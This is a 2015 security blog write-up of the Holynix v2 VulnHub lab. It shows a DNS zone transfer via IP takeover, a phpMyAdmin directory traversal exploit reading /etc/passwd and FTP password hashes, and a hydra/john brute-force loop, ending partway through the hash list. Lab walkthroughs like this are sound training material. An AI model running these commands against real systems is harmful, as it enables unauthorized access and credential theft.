
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>0x73696e65</title>
  <meta name="author" content="Norbert Szetei">

  
  <meta name="description" content="Image: Holynix: v2 We set our network preferences to &ldquo;Share with my Mac&rdquo; on both vulnerable server
and Kali Linux. Our NIC address will &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://73696e65.github.io/posts/9/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="0x73696e65" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-64260520-1']);
    _gaq.push(['_setDomainName','github.io']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body    class="collapse-sidebar sidebar-footer" >
  <header role="banner"><hgroup>
  <h1><a href="/">0x73696e65</a></h1>
  
    <h2>information security notes</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="73696e65.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/10/holynix-v2/">Holynix: V2</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-10T14:35:19+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:35 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/holynix-v2,21/">Holynix: v2</a></p>

<p>We set our network preferences to &ldquo;Share with my Mac&rdquo; on both vulnerable server
and Kali Linux. Our NIC address will be the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ifconfig eth0:1 192.168.1.11</span></code></pre></td></tr></table></div></figure>


<p>Nmap output for 192.168.1.88:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE  SERVICE
</span><span class='line'>20/tcp closed ftp-data
</span><span class='line'>21/tcp open   ftp 
</span><span class='line'>22/tcp open   ssh 
</span><span class='line'>53/tcp open   domain
</span><span class='line'>80/tcp open   http</span></code></pre></td></tr></table></div></figure>


<p>We add to /etc/hosts:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.88 www.zincftp.com
</span><span class='line'>192.168.1.88 zincftp.com</span></code></pre></td></tr></table></div></figure>


<p>Asking DNS server about the domain reports:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# dig @192.168.1.88 zincftp.com
</span><span class='line'>
</span><span class='line'>; &lt;&lt;>> DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;>> @192.168.1.88 zincftp.com
</span><span class='line'>; (1 server found)
</span><span class='line'>;; global options: +cmd
</span><span class='line'>;; Got answer:
</span><span class='line'>;; ->>HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 28383
</span><span class='line'>;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2
</span><span class='line'>
</span><span class='line'>;; QUESTION SECTION:
</span><span class='line'>;zincftp.com.                   IN      A
</span><span class='line'>
</span><span class='line'>;; ANSWER SECTION:
</span><span class='line'>zincftp.com.            38400   IN      A       192.168.1.88
</span><span class='line'>
</span><span class='line'>;; AUTHORITY SECTION:
</span><span class='line'>zincftp.com.            38400   IN      NS      ns1.zincftp.com.
</span><span class='line'>zincftp.com.            38400   IN      NS      ns2.zincftp.com.
</span><span class='line'>
</span><span class='line'>;; ADDITIONAL SECTION:
</span><span class='line'>ns1.zincftp.com.        38400   IN      A       192.168.1.88
</span><span class='line'>ns2.zincftp.com.        38400   IN      A       192.168.1.89
</span><span class='line'>
</span><span class='line'>;; Query time: 3 msec
</span><span class='line'>;; SERVER: 192.168.1.88#53(192.168.1.88)
</span><span class='line'>;; WHEN: Sun May  3 01:04:27 2015
</span><span class='line'>;; MSG SIZE  rcvd: 113</span></code></pre></td></tr></table></div></figure>


<p>We append these lines to /etc/hosts and try DNS AXFR (zone transfer):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.88 ns1.zincftp.com
</span><span class='line'>192.168.1.89 ns2.zincftp.com</span></code></pre></td></tr></table></div></figure>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# dig @192.168.1.88 zincftp.com axfr
</span><span class='line'>
</span><span class='line'>; &lt;&lt;>> DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;>> @192.168.1.88 zincftp.com axfr
</span><span class='line'>; (1 server found)
</span><span class='line'>;; global options: +cmd
</span><span class='line'>; Transfer failed.
</span><span class='line'>root@kali32:~# dig @192.168.1.89 zincftp.com axfr
</span><span class='line'>;; Connection to 192.168.1.89#53(192.168.1.89) for zincftp.com failed: host unreachable.</span></code></pre></td></tr></table></div></figure>


<p>We change our IP address to the IP of the not reachable DNS server and try AXFR again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ifconfig eth0:1 192.168.1.89
</span><span class='line'>root@kali32:~# dig @192.168.1.89 zincftp.com axfr
</span><span class='line'>
</span><span class='line'>; &lt;&lt;>> DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;>> @192.168.1.88 zincftp.com axfr
</span><span class='line'>; (1 server found)
</span><span class='line'>;; global options: +cmd
</span><span class='line'>zincftp.com.            38400   IN      SOA     ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
</span><span class='line'>zincftp.com.            38400   IN      NS      ns1.zincftp.com.
</span><span class='line'>zincftp.com.            38400   IN      NS      ns2.zincftp.com.
</span><span class='line'>zincftp.com.            38400   IN      MX      10 mta.zincftp.com.
</span><span class='line'>zincftp.com.            38400   IN      A       192.168.1.88
</span><span class='line'>ahuxley.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>amckinley.zincftp.com.  38400   IN      A       192.168.1.88
</span><span class='line'>bzimmerman.zincftp.com. 38400   IN      A       192.168.1.88
</span><span class='line'>cbergey.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>cfinnerly.zincftp.com.  38400   IN      A       192.168.1.88
</span><span class='line'>cjalong.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>cmahong.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>cmanson.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>ddonnovan.zincftp.com.  38400   IN      A       192.168.1.88
</span><span class='line'>ddypsky.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>dev.zincftp.com.        38400   IN      A       192.168.1.88
</span><span class='line'>dhammond.zincftp.com.   38400   IN      A       192.168.1.88
</span><span class='line'>dmoran.zincftp.com.     38400   IN      A       192.168.1.88
</span><span class='line'>dsummers.zincftp.com.   38400   IN      A       192.168.1.88
</span><span class='line'>evorhees.zincftp.com.   38400   IN      A       192.168.1.88
</span><span class='line'>gwelch.zincftp.com.     38400   IN      A       192.168.1.88
</span><span class='line'>hmcknight.zincftp.com.  38400   IN      A       192.168.1.88
</span><span class='line'>jgacy.zincftp.com.      38400   IN      A       192.168.1.88
</span><span class='line'>jsmith.zincftp.com.     38400   IN      A       192.168.1.88
</span><span class='line'>jstreet.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>kmccallum.zincftp.com.  38400   IN      A       192.168.1.88
</span><span class='line'>lnickerbacher.zincftp.com. 38400 IN     A       192.168.1.88
</span><span class='line'>lsanderson.zincftp.com. 38400   IN      A       192.168.1.88
</span><span class='line'>lwestre.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>mta.zincftp.com.        38400   IN      A       10.0.192.48
</span><span class='line'>ncobol.zincftp.com.     38400   IN      A       192.168.1.88
</span><span class='line'>ns1.zincftp.com.        38400   IN      A       192.168.1.88
</span><span class='line'>ns2.zincftp.com.        38400   IN      A       192.168.1.89
</span><span class='line'>rcropper.zincftp.com.   38400   IN      A       192.168.1.88
</span><span class='line'>rfrost.zincftp.com.     38400   IN      A       192.168.1.88
</span><span class='line'>rwoo.zincftp.com.       38400   IN      A       192.168.1.88
</span><span class='line'>skrymple.zincftp.com.   38400   IN      A       192.168.1.88
</span><span class='line'>splath.zincftp.com.     38400   IN      A       192.168.1.88
</span><span class='line'>tmartin.zincftp.com.    38400   IN      A       192.168.1.88
</span><span class='line'>trusted.zincftp.com.    38400   IN      A       192.168.1.34
</span><span class='line'>www.zincftp.com.        38400   IN      A       192.168.1.88
</span><span class='line'>zincftp.com.            38400   IN      SOA     ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
</span><span class='line'>;; Query time: 5 msec
</span><span class='line'>;; SERVER: 192.168.1.88#53(192.168.1.88)
</span><span class='line'>;; WHEN: Sun May  3 01:08:24 2015
</span><span class='line'>;; XFR size: 42 records (messages 1, bytes 1021)</span></code></pre></td></tr></table></div></figure>


<p>Appending the list to /etc/hosts:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:~# dig @192.168.1.88 zincftp.com axfr <span class="p">|</span> egrep <span class="s1">&#39;192.168.1.88$&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;{ print $5 &quot; &quot; $1}&#39;</span>  <span class="p">|</span> sed <span class="s1">&#39;s#.$##&#39;</span> &gt;&gt; /etc/hosts
</span></code></pre></td></tr></table></div></figure>


<p>Dirb reports the following URLs:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---- Scanning URL: http://www.zincftp.com/ ----
</span><span class='line'>+ http://www.zincftp.com/index (CODE:200|SIZE:1205)
</span><span class='line'>+ http://www.zincftp.com/index.php (CODE:200|SIZE:1205)
</span><span class='line'>+ http://www.zincftp.com/phpMyAdmin (CODE:403|SIZE:333)
</span><span class='line'>+ http://www.zincftp.com/register (CODE:200|SIZE:16)
</span><span class='line'>+ http://www.zincftp.com/server-status (CODE:403|SIZE:336)
</span><span class='line'>+ http://www.zincftp.com/setup_guides</span></code></pre></td></tr></table></div></figure>


<p>In particular the interesting file was <a href="http://www.zincftp.com/setup_guides/todo">http://www.zincftp.com/setup_guides/todo</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;!--
</span><span class='line'>Adding new users to the system
</span><span class='line'>- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
</span><span class='line'>
</span><span class='line'>create user
</span><span class='line'>        useradd -g ftp_users -s /bin/false -d /home/&lt;username&gt; -m &lt;username&gt;
</span><span class='line'>
</span><span class='line'>create web dir
</span><span class='line'>        mkdir /home/&lt;username&gt;/web
</span><span class='line'>
</span><span class='line'><span class="nb">set </span>ownership so ftp can write to dir
</span><span class='line'>        chown -R vftp:ftp_users /home/&lt;username&gt;
</span><span class='line'>
</span><span class='line'>add ftp user
</span><span class='line'>        pure-pw useradd &lt;username&gt; -u vftp -g ftp_users -d /home/&lt;username&gt;
</span><span class='line'>
</span><span class='line'>update /etc/pure-ftpd/pureftpd.passwd file
</span><span class='line'>        pure-pw mkdb
</span><span class='line'>--&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Again we set our IP address to match the &ldquo;trusted.zincftp.com&rdquo; host, to get access to phpmyadmin:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ifconfig eth0:1 192.168.1.34</span></code></pre></td></tr></table></div></figure>


<p>We found nothing interesting in phpmyadmin, but it&rsquo;s vulnerable and we can interpret the arbitrary file on web server as PHP script.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# ./searchsploit phpmyadmin | grep 2.6
</span><span class='line'>phpMyAdmin 2.6.4-pl1 - Remote Directory Traversal Exploit | /php/webapps/1244.pl
</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../etc/passwd
</span><span class='line'>
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false
</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false
</span><span class='line'>klog:x:103:104::/home/klog:/bin/false
</span><span class='line'>bind:x:104:111::/var/cache/bind:/bin/false
</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>mysql:x:106:115:MySQL Server,,,:/var/lib/mysql:/bin/false
</span><span class='line'>lsanderson:x:1000:114:Lyle Sanderson:/home/lsanderson:/bin/bash
</span><span class='line'>cfinnerly:x:1001:100:Chuck Finnerly:/home/cfinnerly:/bin/bash
</span><span class='line'>ddonnovan:x:1002:100:David Donnovan:/home/ddonnovan:/bin/bash
</span><span class='line'>skrymple:x:1003:100:Shelly Krymple:/home/skrymple:/bin/bash
</span><span class='line'>amckinley:x:1004:100:Agustin Mckinley:/home/amckinley:/bin/bash
</span><span class='line'>cmahong:x:1005:2002::/home/cmahong:/bin/false
</span><span class='line'>lnickerbacher:x:1006:2002::/home/lnickerbacher:/bin/false
</span><span class='line'>jstreet:x:1007:2002::/home/jstreet:/bin/false
</span><span class='line'>rwoo:x:1008:2002::/home/rwoo:/bin/false
</span><span class='line'>kmccallum:x:1009:2002::/home/kmccallum:/bin/false
</span><span class='line'>cjalong:x:1010:2002::/home/cjalong:/bin/false
</span><span class='line'>jsmith:x:1011:2002::/home/jsmith:/bin/false
</span><span class='line'>dhammond:x:1012:2002::/home/dhammond:/bin/false
</span><span class='line'>hmcknight:x:1013:2002::/home/hmcknight:/bin/false
</span><span class='line'>lwestre:x:1014:2002::/home/lwestre:/bin/false
</span><span class='line'>gwelch:x:1015:2002::/home/gwelch:/bin/false
</span><span class='line'>dmoran:x:1016:2002::/home/dmoran:/bin/false
</span><span class='line'>dsummers:x:1017:2002::/home/dsummers:/bin/false
</span><span class='line'>bzimmerman:x:1018:2002::/home/bzimmerman:/bin/false
</span><span class='line'>ncobol:x:1019:2002::/home/ncobol:/bin/false
</span><span class='line'>ddypsky:x:1020:2002::/home/ddypsky:/bin/false
</span><span class='line'>rcropper:x:1021:2002::/home/rcropper:/bin/false
</span><span class='line'>cbergey:x:1022:2002::/home/cbergey:/bin/false
</span><span class='line'>tmartin:x:1023:2002::/home/tmartin:/bin/false
</span><span class='line'>jgacy:x:1024:2002::/home/jgacy:/bin/false
</span><span class='line'>splath:x:1025:2002::/home/splath:/bin/false
</span><span class='line'>evorhees:x:1026:2002::/home/evorhees:/bin/false
</span><span class='line'>rfrost:x:1027:2002::/home/rfrost:/bin/false
</span><span class='line'>ahuxley:x:1028:2002::/home/ahuxley:/bin/false
</span><span class='line'>webmaster:x:1029:2002::/var/www:/bin/false
</span><span class='line'>cmanson:x:1030:2002::/home/cmanson:/bin/false
</span><span class='line'>vftp:x:1031:2002:Virtual FTP User:/dev/null:/bin/false</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/apache2/apache2.conf | grep -i log
</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/conf/PureDB
</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/pureftpd.pdb
</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/init.d/firewall</span></code></pre></td></tr></table></div></figure>


<p>We can also try to perform the brute-force attack on ftp users (see /etc/group)
and generate the short wordlist with john according username, but without
success, ftp connection is limited with the firewall:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:~# <span class="k">for</span> i in <span class="k">$(</span>cat ftp-users<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$i</span> &gt; john-temp-wl <span class="p">;</span> john --wordlist<span class="o">=</span><span class="s2">&quot;john-temp-wl&quot;</span> --rules --stdout &gt; john-temp-wl-with-rules<span class="p">;</span> hydra -l <span class="nv">$i</span> -P john-temp-wl-with-rules 192.168.1.88 ftp -V -t <span class="m">1</span> -w 50<span class="p">;</span> <span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>


<p>After a while we found the hash list for ftp and used the john to crack it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/pureftpd.passwd
</span><span class='line'>
</span><span class='line'>cmahong:$1$vUW5q3t0$9RZSkReNoWGCaPtL7ixLX0:1031:2002::/home/cmahong/./::::::::::::
</span><span class='line'>lnickerbacher:$1$yiEZKCE0$BOuvM8nrfoNGWAcjPenpa.:1031:2002::/home/lnickerbacher/./::::::::::::
</span><span class='line'>jstreet:$1$sBGmOuB0$TPHx0jBSFjtJu7dJXb4Nw/:1031:2002::/home/jstreet/./::::::::::::
</span><span class='line'>rwoo:$1$VZxDrE30$p7NPDTkxuQhPSsLpi2a1H1:1031:2002::/home/rwoo/./::::::::::::
</span><span class='line'>cfinnerly:$1$dRGyIOy0$OVGBtLHyxFjPg7tmxtvHY/:1031:2002::/home/cfinnerly/./::::::::::::
</span><span class='line'>kmccallum:$1$dijBzwn0$qlGcbcTT0Qyg8wQf4.QiG1:1031:2002::/home/kmccallum/./::::::::::::
</span><span class='line'>cjalong:$1$FVj4if60$BWSIDiE97oTKUs70qOjZx/:1031:2002::/home/cjalong/./::::::::::::
</span><span class='line'>jsmith:$1$yQKaOpR0$UdySwRtPd1upTckQ5/.CM/:1031:2002::/home/jsmith/./::::::::::::
</span><span class='line'>lsanderson:$1$gzIP52U0$cL6XE61yDZD0unvIIkV8l/:1031:2002::/home/lsanderson/./::::::::::::
</span><span class='line'>dhammond:$1$yK9OuzZ0$W7mgvS4SisxP1BwdLsuy1/:1031:2002::/home/dhammond/./::::::::::::
</span><span class='line'>hmcknight:$1$A07SpdB0$hs/m8KyoJyY3gVAhlWDQI/:1031:2002::/home/hmcknight/./::::::::::::
</span><span class='line'>lwestre:$1$.R5Dbl60$n2ajoJce/LnPVCq497sUQ.:1031:2002::/home/lwestre/./::::::::::::
</span><span class='line'>gwelch:$1$/uYT22Y0$njR3vmLQrbnAugwkNLgJ5/:1031:2002::/home/gwelch/./::::::::::::
</span><span class='line'>dmoran:$1$JZrJXdU0$ORe5.yRgQHCQl6h14rEEe.:1031:2002::/home/dmoran/./::::::::::::
</span><span class='line'>dsummers:$1$VXo3pWp0$v0J7NsxRhDy/ufU01P/ch1:1031:2002::/home/dsummers/./::::::::::::
</span><span class='line'>bzimmerman:$1$rQep6B90$ZtnoFZpTEBkNoRCfqJRpe/:1031:2002::/home/bzimmerman/./::::::::::::
</span><span class='line'>amckinley:$1$45Bz0af0$Fsfo.XXcLkVzSaH5bLjzI0:1031:2002::/home/amckinley/./::::::::::::
</span><span class='line'>ncobol:$1$q.xxgp70$645DFncdOFc24n93la5a70:1031:2002::/home/ncobol/./::::::::::::
